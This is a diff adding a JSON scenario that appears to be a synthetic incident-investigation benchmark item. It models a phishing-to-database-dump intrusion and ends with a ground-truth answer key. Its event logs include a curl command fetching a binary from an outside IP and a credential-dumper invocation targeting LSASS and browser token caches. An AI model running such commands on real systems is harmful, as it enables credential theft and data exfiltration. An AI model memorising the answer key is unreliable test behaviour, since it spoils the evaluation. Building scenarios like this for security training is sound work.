@@ -1,0 +1,240 @@
+{
+  "id": "scenario-apt-solar-infiltrate",
+  "title": "Operation GhostPulse: Lateral Movement via Stolen Session Token",
+  "description": "Multi-stage enterprise incident involving developer credential compromise, in-memory token theft, lateral movement to internal application server, and unauthorized database access.",
+  "severity": "critical",
+  "entities": [
+    {
+      "id": "usr-mchen",
+      "name": "Marcus Chen (Staff Engineer)",
+      "type": "user",
+      "zone": "workstation_vlan",
+      "position_3d": [-4.0, 0.0, 3.0],
+      "attributes": { "department": "Core Platform", "role": "Senior Developer" }
+    },
+    {
+      "id": "workstation-eng-42",
+      "name": "DEV-STATION-42",
+      "type": "workstation",
+      "ip_address": "10.0.14.42",
+      "zone": "workstation_vlan",
+      "position_3d": [-4.0, 0.0, 0.0],
+      "attributes": { "os": "Windows 11 Pro Enterprise", "edr_agent": "Active v4.1" }
+    },
+    {
+      "id": "srv-auth-okta",
+      "name": "IDP-SSO-GATEWAY",
+      "type": "identity_provider",
+      "ip_address": "10.0.1.10",
+      "zone": "identity",
+      "position_3d": [0.0, 0.0, 4.0],
+      "attributes": { "service": "Corporate Okta / OIDC", "mfa_policy": "Enforced" }
+    },
+    {
+      "id": "srv-app-gateway",
+      "name": "APP-ROUTER-INTERNAL",
+      "type": "server",
+      "ip_address": "10.0.20.15",
+      "zone": "prod_internal",
+      "position_3d": [0.0, 0.0, 0.0],
+      "attributes": { "role": "Internal Microservices Proxy", "tier": "Production" }
+    },
+    {
+      "id": "srv-db-prod",
+      "name": "PROD-CUSTOMER-DB01",
+      "type": "database",
+      "ip_address": "10.0.30.8",
+      "zone": "prod_internal",
+      "position_3d": [4.0, 0.0, 0.0],
+      "attributes": { "engine": "PostgreSQL 16 Enterprise", "encryption": "AES-256" }
+    },
+    {
+      "id": "tok-session-mchen-88",
+      "name": "OIDC-BEARER-TOKEN-88F9",
+      "type": "session_token",
+      "zone": "identity",
+      "position_3d": [0.0, 1.5, 2.0],
+      "attributes": { "scope": "internal-prod-api:read write", "issued_to": "usr-mchen" }
+    },
+    {
+      "id": "proc-mimikatz",
+      "name": "suspicious_dumper.exe",
+      "type": "process",
+      "zone": "workstation_vlan",
+      "position_3d": [-4.0, 1.2, -1.5],
+      "attributes": { "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" }
+    },
+    {
+      "id": "proc-sql-client",
+      "name": "psql-runner",
+      "type": "process",
+      "zone": "prod_internal",
+      "position_3d": [2.0, 1.0, 0.0],
+      "attributes": { "user_context": "srv-app-svc" }
+    }
+  ],
+  "events": [
+    {
+      "id": "EVT-1001",
+      "timestamp": "2026-10-18T08:14:02Z",
+      "event_type": "auth_login",
+      "source_entity_id": "usr-mchen",
+      "target_entity_id": "workstation-eng-42",
+      "actor_id": "usr-mchen",
+      "session_id": "sess-local-4412",
+      "severity": "info",
+      "summary": "Marcus Chen logged onto DEV-STATION-42 via interactive console.",
+      "observable_data": { "logon_type": 2, "source_ip": "127.0.0.1" }
+    },
+    {
+      "id": "EVT-1002",
+      "timestamp": "2026-10-18T08:15:30Z",
+      "event_type": "auth_login",
+      "source_entity_id": "workstation-eng-42",
+      "target_entity_id": "srv-auth-okta",
+      "actor_id": "usr-mchen",
+      "session_id": "sess-sso-991",
+      "severity": "info",
+      "summary": "SSO authentication successful for usr-mchen against IDP-SSO-GATEWAY with WebAuthn MFA.",
+      "observable_data": { "auth_protocol": "OIDC", "mfa_method": "FIDO2" }
+    },
+    {
+      "id": "EVT-1003",
+      "timestamp": "2026-10-18T08:15:35Z",
+      "event_type": "token_mint",
+      "source_entity_id": "srv-auth-okta",
+      "target_entity_id": "tok-session-mchen-88",
+      "actor_id": "usr-mchen",
+      "session_id": "tok-session-mchen-88",
+      "severity": "info",
+      "summary": "IDP minted session token OIDC-BEARER-TOKEN-88F9 for usr-mchen with scope 'internal-prod-api'.",
+      "observable_data": { "token_id": "tok-session-mchen-88", "ttl_seconds": 28800 }
+    },
+    {
+      "id": "EVT-1004",
+      "timestamp": "2026-10-18T08:21:10Z",
+      "event_type": "network_connect",
+      "source_entity_id": "workstation-eng-42",
+      "target_entity_id": "srv-app-gateway",
+      "actor_id": "usr-mchen",
+      "session_id": "tok-session-mchen-88",
+      "severity": "info",
+      "summary": "Workstation opened HTTPS connection to APP-ROUTER-INTERNAL using bearer token OIDC-BEARER-TOKEN-88F9 (Routine CI query).",
+      "observable_data": { "uri": "/api/v1/builds/status", "http_status": 200 }
+    },
+    {
+      "id": "EVT-1005",
+      "timestamp": "2026-10-18T08:44:18Z",
+      "event_type": "process_spawn",
+      "source_entity_id": "workstation-eng-42",
+      "target_entity_id": "workstation-eng-42",
+      "actor_id": "usr-mchen",
+      "session_id": "sess-local-4412",
+      "process_lineage": {
+        "pid": 5012,
+        "ppid": 1024,
+        "binary_path": "C:\\Windows\\System32\\cmd.exe",
+        "command_line": "cmd.exe /c curl -s http://198.51.100.22/d.exe -o C:\\Temp\\d.exe"
+      },
+      "severity": "high",
+      "summary": "cmd.exe spawned from Outlook email attachment handler downloading staging binary d.exe.",
+      "observable_data": { "parent_process": "OUTLOOK.EXE", "remote_ip": "198.51.100.22" }
+    },
+    {
+      "id": "EVT-1006",
+      "timestamp": "2026-10-18T08:44:22Z",
+      "event_type": "process_spawn",
+      "source_entity_id": "workstation-eng-42",
+      "target_entity_id": "proc-mimikatz",
+      "actor_id": "usr-mchen",
+      "session_id": "sess-local-4412",
+      "process_lineage": {
+        "pid": 5120,
+        "ppid": 5012,
+        "binary_path": "C:\\Temp\\d.exe",
+        "command_line": "C:\\Temp\\d.exe --dump-lsass --target-tokens"
+      },
+      "severity": "critical",
+      "summary": "Suspicious binary d.exe spawned by cmd.exe targeting process memory token caches.",
+      "observable_data": { "integrity_level": "High", "privilege": "SeDebugPrivilege" }
+    },
+    {
+      "id": "EVT-1007",
+      "timestamp": "2026-10-18T08:44:50Z",
+      "event_type": "file_access",
+      "source_entity_id": "proc-mimikatz",
+      "target_entity_id": "workstation-eng-42",
+      "actor_id": "usr-mchen",
+      "session_id": "sess-local-4412",
+      "process_lineage": {
+        "pid": 5120,
+        "ppid": 5012,
+        "binary_path": "C:\\Temp\\d.exe"
+      },
+      "severity": "critical",
+      "summary": "Memory read on LSASS and Edge token cache file: extracted bearer token tok-session-mchen-88.",
+      "observable_data": { "accessed_file": "C:\\Users\\mchen\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies", "extracted_token": "tok-session-mchen-88" }
+    },
+    {
+      "id": "EVT-1008",
+      "timestamp": "2026-10-18T08:52:04Z",
+      "event_type": "network_connect",
+      "source_entity_id": "workstation-eng-42",
+      "target_entity_id": "srv-app-gateway",
+      "actor_id": "usr-mchen",
+      "session_id": "tok-session-mchen-88",
+      "severity": "high",
+      "summary": "Anomalous API request sent to APP-ROUTER-INTERNAL using stolen token tok-session-mchen-88 requesting privileged database proxy tunnel.",
+      "observable_data": { "uri": "/api/v1/internal/admin/db-tunnel", "user_agent": "python-requests/2.31.0" }
+    },
+    {
+      "id": "EVT-1009",
+      "timestamp": "2026-10-18T08:52:15Z",
+      "event_type": "process_spawn",
+      "source_entity_id": "srv-app-gateway",
+      "target_entity_id": "proc-sql-client",
+      "actor_id": "srv-app-svc",
+      "session_id": "tok-session-mchen-88",
+      "process_lineage": {
+        "pid": 8901,
+        "ppid": 1200,
+        "binary_path": "/usr/bin/psql",
+        "command_line": "psql -h 10.0.30.8 -U app_admin -d customer_records"
+      },
+      "severity": "critical",
+      "summary": "APP-ROUTER-INTERNAL spawned psql process connecting to PROD-CUSTOMER-DB01 under context of bearer token tok-session-mchen-88.",
+      "observable_data": { "db_host": "10.0.30.8", "db_name": "customer_records" }
+    },
+    {
+      "id": "EVT-1010",
+      "timestamp": "2026-10-18T08:53:01Z",
+      "event_type": "file_access",
+      "source_entity_id": "proc-sql-client",
+      "target_entity_id": "srv-db-prod",
+      "actor_id": "srv-app-svc",
+      "session_id": "tok-session-mchen-88",
+      "severity": "critical",
+      "summary": "Direct SQL query execution `SELECT * FROM enterprise_tenants_pii` dumped 142,000 records.",
+      "observable_data": { "records_accessed": 142000, "table": "enterprise_tenants_pii" }
+    }
+  ],
+  "ground_truth": {
+    "threat_actor": "UNC-4192 (Financial Data Exfiltration Group)",
+    "initial_access_vector": "Phishing email with malicious attachment on DEV-STATION-42",
+    "root_cause_event_ids": ["EVT-1005"],
+    "primary_causal_path": ["EVT-1005", "EVT-1006", "EVT-1007", "EVT-1008", "EVT-1009", "EVT-1010"],
+    "critical_milestone_event_ids": ["EVT-1003", "EVT-1005", "EVT-1007", "EVT-1008", "EVT-1010"],
+    "valid_explanations": [
+      "Credential and token theft from workstation memory enabled lateral API traversal and database dump"
+    ],
+    "invalid_explanations": [
+      "Authorized DBA database maintenance",
+      "Direct external SQL injection against srv-db-prod"
+    ]
+  },
+  "metadata": {
+    "created_at": "2026-10-18T10:00:00Z",
+    "author": "CausalOps Ground Truth Laboratory",
+    "version": "1.0.0"
+  }
+}
